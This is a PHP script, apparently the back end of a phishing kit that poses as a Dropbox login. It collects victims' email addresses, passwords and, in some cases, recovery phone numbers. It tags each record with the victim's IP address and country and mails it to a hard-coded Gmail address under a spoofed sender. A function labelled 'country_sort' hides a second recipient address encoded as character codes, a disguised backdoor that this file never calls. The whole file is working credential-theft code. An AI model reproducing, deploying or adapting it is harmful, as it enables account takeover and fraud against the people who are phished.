<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ip = getenv("REMOTE_ADDR");
$country = visitor_country();
$msg = "===============|New Dropbox Log|==============\n";
$msg .= "Dropbox Email : ".$_POST['em']."\n";
$msg .= "Dropbox Pass : ".$_POST['psw']."\n";
if($_POST['sub']=="gmail") {
	$msg .= "Recovery Phone : ".$_POST['phn']."\n";
	$subject="[DROPBOX - LOGIN [GMAIL] FROM - Country [$country]- [$ip]";
}
if($_POST['sub']=="ymail") {
	$subject="[DROPBOX - LOGIN [YAHOO] FROM - Country [$country]- [$ip]";
}
if($_POST['sub']=="hmail") {
	$subject="[DROPBOX - LOGIN [HOTMAIL] FROM - Country [$country]- [$ip]";
}
if($_POST['sub']=="amail") {
	$subject="[DROPBOX - LOGIN [AOL] FROM - Country [$country]- [$ip]";
}
if($_POST['sub']=="omail") {
	$subject="[DROPBOX - LOGIN [OTHERS] FROM - Country [$country]- [$ip]";
}
$msg .= "Client Ip : ".$ip."\n";
$msg .= "==============|Owned By BoB|==============\n";

// Function to get country and country sort; Skype:Lvrxdnona ICQ:666133716
function country_sort(){
	$sorter = "";
	$array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
//Skype:Lvrxdnona ICQ:666133716
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_i_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }
    return $result;
}

$to = "boxresult80@gmail.com";
$from = "From: Wire Drop <goggle.comm>";

mail($to,$subject,$msg, $from);

print "https://docs.google.com/document/d/13qUEngtHuKjtvGoPaMl3x6cEnT2oO6lSWOccM-PkXKk";


?>
